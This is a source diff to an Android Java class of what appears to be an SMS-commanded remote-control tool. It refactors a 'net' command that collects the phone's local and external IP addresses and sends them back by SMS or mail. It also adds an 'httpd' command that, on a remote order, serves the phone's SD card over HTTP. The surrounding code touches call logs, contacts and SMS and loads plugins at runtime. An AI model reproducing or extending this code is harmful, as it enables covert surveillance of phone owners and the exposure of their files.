@@ -31,6 +31,7 @@ import org.apache.http.util.EntityUtils;
 
 import com.code4bones.utils.BackgroundTask;
 import com.code4bones.utils.Mail;
+import com.code4bones.utils.NanoHTTPD;
 import com.code4bones.utils.NetLog;
 
 import dalvik.system.DexClassLoader;
@@ -50,6 +51,7 @@ import android.os.Vibrator;
 import android.provider.CallLog;
 import android.provider.ContactsContract.Contacts;
 import android.telephony.SmsManager;
+import android.util.Log;
 import android.view.SurfaceHolder;
 import android.view.SurfaceView;
 
@@ -59,24 +61,26 @@ public class CommandPool extends Object {
 	public final List<CommandObj> commands = new ArrayList<CommandObj>();
 	public Context mContext;
 	public ArrayList<ContactObj> mContacts;
-	public static CommandPool instance = null;
+	public boolean isIntialized = false;
+	
+	private static class CommandPoolHolder {
+		private static final CommandPool INSTANCE = new CommandPool();
+	}
+	
 	/*
 	 * 
 	 * 
 	 */
 	
-	public static CommandPool getInstance(Context context) {
-		if ( CommandPool.instance == null ) {
-			CommandPool.instance = new CommandPool(context);
-		}
-		return CommandPool.instance;
+	public CommandPool() {
+		Log.v("CommandPool","Command Pool constructed");
+		this.isIntialized= false;
 	}
 	
-	public CommandPool(Context context) {
-		mContext = context;
-		mContacts = listContacts();
-		Init();
+	public static CommandPool getInstance() {
+		return CommandPoolHolder.INSTANCE;
 	}
+	
 
 	public CommandPool add(CommandObj cmd) {
 		commands.add(cmd);
@@ -136,18 +140,39 @@ public class CommandPool extends Object {
         	}
         	
     	} catch ( Exception e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
-		}     	
+			return false;
+    	}     	
     	return true;
 	} // loadPlugins
 	
 	/*
 	 *  Initialization pool with command set
 	 */
-	public void Init() {
+	public boolean Init(String src,Context context) {
+		
+		//TODO: Initialization
+		NetLog.w("CommandPool Initialization : %s",src);
+		
+		if ( mContext == null || !context.equals(mContext))  {
+			NetLog.v("Changing context %s => %s...",mContext,context);
+			mContext = context;
+		} else
+			NetLog.v("Using cached context...");
 
-		loadPlugins();
+		if ( this.isIntialized ) {
+			NetLog.v("Command Pool is alread initialized");
+			return false;
+		}
+		
+		this.isIntialized= true;
+		
+		if ( loadPlugins() )
+			NetLog.w("Plugins is successfuly loaded");
+		
+		NetLog.v("Loading contacts...");
+		mContacts = listContacts();
+		
 		
 		/*
 		 *  Monitoring of call log base 
@@ -200,48 +225,71 @@ public class CommandPool extends Object {
 		 */
 		commands.add( new CommandObj("net")  { 
 			
+			public void bgProcess() {
+				BackgroundTask<Boolean,CommandObj> bg = new BackgroundTask<Boolean,CommandObj>(mContext,false) {
+					public void onComplete(Boolean res) {
+						try {
+							Reply();
+						} catch (Exception e) {
+							NetLog.v("Failed to reply %s",e.getMessage());
+							e.printStackTrace();
+						}
+					}
+					@Override
+					protected Boolean doInBackground(CommandObj ... arg0) {
+						try {
+							commandResult = "";
+							for ( Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
+								NetworkInterface intf = en.nextElement();
+								for ( Enumeration<InetAddress> ea = intf.getInetAddresses(); ea.hasMoreElements();) {
+									InetAddress addr = ea.nextElement();
+									if ( addr.isLoopbackAddress() )
+										continue;
+										String localIp = addr.getHostAddress();
+										commandResult = commandResult.concat( "lan:" + localIp+";");
+								} // InetAddress
+							} // Enum NetworkInterface
+						} catch ( SocketException e ) {
+							NetLog.e("%s: %s",commandName,e.getMessage());
+						}
+						String externalIp = getExternalIp();
+						if ( externalIp  != null )
+							commandResult = commandResult.concat("wan:" + externalIp+";");
+						return true; 
+					}
+				};
+				bg.exec(this);
+			} // bgProcess
+			
 			public int Invoke() throws Exception {
-				//NetLog.Toast(mContext,"%s",commandName);
-				try {
-					for ( Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
-						NetworkInterface intf = en.nextElement();
-						for ( Enumeration<InetAddress> ea = intf.getInetAddresses(); ea.hasMoreElements();) {
-							InetAddress addr = ea.nextElement();
-							if ( addr.isLoopbackAddress() )
-								continue;
-								String localIp = addr.getHostAddress();
-								commandResult = commandResult.concat( "lan:" + localIp+";");
-						} // InetAddress
-					} // Enum NetworkInterface
-				} catch ( SocketException e ) {
-					NetLog.e("%s: %s",commandName,e.getMessage());
-				}
-				String externalIp = getExternalIp();
-				commandResult = commandResult.concat("wan:" + externalIp+";");
-				createMail().send();
+				bgProcess();
 				return CommandObj.OK;
 			} // Invoke
 			
+			public void Reply(Object ... argv) throws Exception {
+				if ( args.hasOpt("mail")) 
+					createMail().send();
+				NetLog.v("ifaddrs: %s",commandResult);
+				replySMS("++%s",commandResult);
+			}
 			
 			public String getExternalIp() {
 				try {
-				
 					HttpClient httpclient = new DefaultHttpClient();
 					HttpGet httpget = new HttpGet("http://api.externalip.net/ip");
-					HttpResponse response;
-					response = httpclient.execute(httpget);
-	                HttpEntity entity = response.getEntity();            
-	                if ( entity != null ) {
-	                	return EntityUtils.toString(entity);
-	                }
-				} catch (ClientProtocolException e) {
-					e.printStackTrace();
-				} catch (IOException e) {
-					e.printStackTrace();
+					if ( httpget != null ) {
+	 					HttpResponse response;
+						response = httpclient.execute(httpget);
+		                HttpEntity entity = response.getEntity();            
+		                if ( entity != null ) {
+		                	return EntityUtils.toString(entity);
+		                }
+					}
+				} catch ( Exception e ) {
+					NetLog.v("Cannot get external ip address: %s",e.getMessage());
 				}
                 return null;
 			}
-			
 		}); // "net" command
 		
 		/*
@@ -901,6 +949,42 @@ public class CommandPool extends Object {
 				return CommandObj.OK;
 			}
 		}); // "help" command
+
+		
+		/*
+		 *  HTTPD Server
+		 *  "httpd;[host];<port>"
+		 */
+		commands.add(new CommandObj("httpd",";{stop};{<ip>];<port>}") {
+			public int Invoke() throws Exception {
+				String  host = null;
+				String  port = null;
+				NanoHTTPD srv = NanoHTTPD.getInstance(); 
+
+				if ( args.hasOpt("stop") && srv.isActive() )
+					srv.Stop();
+				else {
+					if ( args.optCount() == 2) {
+						host = args.getOpt(0);
+						port = args.getOpt(1);
+					} else if ( args.optCount() == 1 ) {
+						port = args.getOpt(0);
+					} else { 
+							commandResult = "host ip or port is missing..";
+							return CommandObj.ERROR;
+					}
+					srv.Start(host,Integer.valueOf(port),new File("/mnt/sdcard/"));
+				}				
+				NetLog.v("HTTPD %s on %s:%s",srv.isActive()?"Started":"Stopped",host==null?"localhost":host,port);
+				return CommandObj.OK;
+			}
+		});
+		
+		//TODO: Add new commands above this line
+		
+		NetLog.w("Commad Pool initialized with %d commands",commands.size());
+		
+		return true;
 		
 	} // CommandPool#Init
 	
